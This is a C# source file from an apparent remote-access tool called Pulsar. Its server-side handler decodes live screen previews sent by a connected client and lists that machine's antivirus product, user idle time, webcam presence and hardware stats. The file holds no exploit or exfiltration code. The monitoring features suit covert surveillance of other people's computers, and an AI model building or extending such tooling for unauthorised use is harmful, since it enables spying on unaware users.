using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.Preview;
using Pulsar.Common.Messages.Webcam;
using Pulsar.Common.Networking;
using Pulsar.Common.Video.Codecs;
using Pulsar.Server.Controls;
using Pulsar.Server.Networking;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Server.Messages
{
    public class PreviewHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        public bool IsStarted { get; set; }

        private readonly object _syncLock = new object();
        private readonly PictureBox _box;
        private readonly Client _client;
        private UnsafeStreamCodec _codec;
        private ListView _verticleStatsTable;

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="LocalResolution"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _sizeLock = new object();

        private int _lastPingMs = -1;
        private GetPreviewResponse _lastPreviewResponse;
        
        /// <summary>
        /// The ping handler for measuring network latency separately from preview requests.
        /// </summary>
        private readonly PingHandler _pingHandler;public PreviewHandler(Client client, PictureBox box, ListView importantStatsView) : base(true)
        {
            _box = box;
            _client = client;
            LocalResolution = box.Size;
            _verticleStatsTable = importantStatsView;
            _pingHandler = new PingHandler(client);
            _pingHandler.ProgressChanged += OnPingReceived;
            MessageHandler.Register(_pingHandler);
            try
            {
                _pingHandler.SendPing();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error sending initial ping: {ex.Message}");
            }
        }
        
        /// <summary>
        /// Called when a ping response is received.
        /// </summary>
        /// <param name="sender">The ping handler.</param>
        /// <param name="pingMs">The ping time in milliseconds.</param>
        private void OnPingReceived(object sender, int pingMs)
        {
            SetLastPing(pingMs);
        }

        /// <summary>
        /// The local resolution, see <seealso cref="LocalResolution"/>.
        /// </summary>
        private Size _localResolution;

        /// <summary>
        /// The local resolution in width x height. It indicates to which resolution the received frame should be resized.
        /// </summary>
        /// <remarks>
        /// This property is thread-safe.
        /// </remarks>
        public Size LocalResolution
        {
            get
            {
                lock (_sizeLock)
                {
                    return _localResolution;
                }
            }
            set
            {
                lock (_sizeLock)
                {
                    _localResolution = value;
                }
            }
        }

        public override bool CanExecute(IMessage message) => message is GetPreviewResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPreviewResponse frame:
                    Execute(sender, frame);
                    break;
            }
        }

        private void Execute(ISender client, GetPreviewResponse message)
        {
            lock (_syncLock)
            {

                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
                {
                    _codec?.Dispose();
                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                }

                using (MemoryStream ms = new MemoryStream(message.Image))
                {
                    try
                    {
                        Bitmap boxmap = new Bitmap(_codec.DecodeData(ms), LocalResolution);
                        OnReport(boxmap);

                        _box.Image = boxmap;
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine("Error decoding image: " + ex.Message);
                    }

                }

                message.Image = null;

                if (_verticleStatsTable.InvokeRequired)
                {
                    _verticleStatsTable.Invoke(new MethodInvoker(() =>
                    {
                        UpdateStats(message);
                    }));
                }
                else
                {
                    UpdateStats(message);
                }
            }
        }
        
        public void SetLastPing(int ms)
        {
            _lastPingMs = ms;
            if (_verticleStatsTable != null && _verticleStatsTable.IsHandleCreated && _lastPreviewResponse != null)
            {
                if (_verticleStatsTable.InvokeRequired)
                {
                    _verticleStatsTable.Invoke(new MethodInvoker(() => UpdateStats(_lastPreviewResponse)));
                }
                else
                {
                    UpdateStats(_lastPreviewResponse);
                }
            }
        }
        
        private void UpdateStats(GetPreviewResponse message)
        {
            try
            {
                if (message == null)
                {
                    return;
                }

                _lastPreviewResponse = message;

                // Check if the ListView has been initialized and has columns
                if (_verticleStatsTable.Columns.Count < 2)
                {
                    // Create columns if they don't exist
                    if (_verticleStatsTable.Columns.Count == 0)
                        _verticleStatsTable.Columns.Add("Names", 100);
                    if (_verticleStatsTable.Columns.Count == 1)
                        _verticleStatsTable.Columns.Add("Stats", 150);
                }

                // Clear existing items to avoid duplicate entries
                _verticleStatsTable.Items.Clear();

                // Add the stats as new items
                var cpuItem = new ListViewItem("CPU");
                cpuItem.SubItems.Add(message.CPU);
                _verticleStatsTable.Items.Add(cpuItem);

                var gpuItem = new ListViewItem("GPU");
                gpuItem.SubItems.Add(message.GPU);
                _verticleStatsTable.Items.Add(gpuItem);

                if (double.TryParse(message.RAM, out double ramInMb))
                {
                    double ramInGb = ramInMb / 1024;
                    int roundedRAM = (int)Math.Round(ramInGb);
                    var ramItem = new ListViewItem("RAM");
                    ramItem.SubItems.Add($"{roundedRAM} GB");
                    _verticleStatsTable.Items.Add(ramItem);
                }
                else
                {
                    var ramItem = new ListViewItem("RAM");
                    ramItem.SubItems.Add(message.RAM);
                    _verticleStatsTable.Items.Add(ramItem);
                }

                var uptimeItem = new ListViewItem("Uptime");
                uptimeItem.SubItems.Add(message.Uptime);
                _verticleStatsTable.Items.Add(uptimeItem);

                var antivirusItem = new ListViewItem("Antivirus");
                antivirusItem.SubItems.Add(message.AV);
                _verticleStatsTable.Items.Add(antivirusItem);

                var mainBrowserItem = new ListViewItem("Default Browser");
                mainBrowserItem.SubItems.Add(message.MainBrowser);
                _verticleStatsTable.Items.Add(mainBrowserItem);

                var pingItem = new ListViewItem("Ping");
                pingItem.SubItems.Add(_lastPingMs >= 0 ? _lastPingMs + " ms" : "N/A");
                _verticleStatsTable.Items.Add(pingItem);

                var webcamItem = new ListViewItem("Webcam");
                webcamItem.SubItems.Add(message.HasWebcam ? "Yes" : "No");
                _verticleStatsTable.Items.Add(webcamItem);

                var afkItem = new ListViewItem("AFK Time");
                afkItem.SubItems.Add(message.AFKTime);
                _verticleStatsTable.Items.Add(afkItem);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Error updating stats: " + ex.Message);
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
        
        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    _codec?.Dispose();
                    IsStarted = false;
                }
                
                if (_pingHandler != null)
                {
                    MessageHandler.Unregister(_pingHandler);
                    _pingHandler.ProgressChanged -= OnPingReceived;
                }
            }
        }
    }
}